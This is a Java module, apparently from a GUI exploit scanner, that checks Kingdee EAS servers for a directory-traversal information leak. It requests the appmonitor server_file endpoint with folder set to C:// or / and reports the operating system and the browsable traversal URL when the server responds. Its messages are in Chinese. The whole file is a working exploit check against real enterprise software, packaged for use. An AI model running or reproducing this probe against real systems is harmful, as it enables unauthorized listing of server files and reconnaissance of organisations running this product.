package exp.oa.kingdeeoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class kingdee_EAS_serverFile_overload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为信息泄露，请访问url进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String urlWin = url + "/appmonitor/protected/selector/server_file/files?folder=C://&suffix=";
            String urlLin = url + "/appmonitor/protected/selector/server_file/files?folder=/&suffix=";
            Response getW_res = HttpTools.get(urlWin , head, "utf-8");
            Response getL_res = HttpTools.get(urlLin , head, "utf-8");
            if (getW_res.getCode() == 200 && getW_res.getText().contains("rows")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ kingdee_EAS_serverFile_overload ]");
                    textArea.appendText("\n 该系统为windows系统 \n 目录遍历页面: "+url + "/appmonitor/protected/selector/server_file/files?folder=C://&suffix=");
                    textArea.appendText("\n");
                });

                return true;
            } else if(getL_res.getCode() == 200 && getL_res.getText().contains("rows")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ kingdee_EAS_serverFile_overload ]");
                    textArea.appendText("\n 该系统为Linux系统 \n 目录遍历页面: "+url + "/appmonitor/protected/selector/server_file/files?folder=/&suffix=");
                    textArea.appendText("\n");
                });
                return true;
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
